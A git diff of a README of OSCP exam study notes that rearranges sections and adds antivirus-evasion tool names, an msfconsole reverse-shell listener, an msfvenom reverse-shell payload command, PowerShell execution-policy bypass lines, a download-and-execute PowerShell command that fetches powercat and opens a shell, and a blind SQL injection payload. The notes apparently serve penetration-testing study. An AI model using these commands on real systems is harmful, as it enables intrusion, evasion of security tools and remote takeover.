@@ -1,16 +1,7 @@
 # OSCP-Notes
 Cheatsheet/Notes from PEN-200 Learning Platform for the OSCP Exam
 
-Payload Generator msfvenom:
 
-    msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f exe > binary.exe
-
-Execution Policy on Windows:
-
-    Get-ExecutionPolicy -Scope CurrentUser
-    Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
-    ExecutionPolicy -bypass
-    
 Transfer File From Windows To Linux via ssh:
     1.on linux 2. on windows:
     
@@ -73,7 +64,26 @@ Web App Pentest
   Time Based Blind SQL:
       ' AND IF (1=1, sleep(3),'false') -- //
 
+Anti-Virus Bypass Tools (AV Bypass) : 
+    1.shellter (obfuscating and inserting payloads in file normal files) 
+    2.vail - obfuscating payload codes themselfs
+    Reccomendation: Use the meterpreter reverse shells and run msfconsole listener below. (adjust ofc)
 
+Msfconsole Listener:
 
+        msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.50.1;set LPORT 443;run;"
+
+Payload Generator msfvenom:
+
+    msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f exe > binary.exe
+
+Execution Policy on Windows:
+
+    Get-ExecutionPolicy -Scope CurrentUser
+    Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
+    ExecutionPolicy -bypass
+    
+        
 Download and execute in PowerShell:
-  IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell 
+
+    IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell 
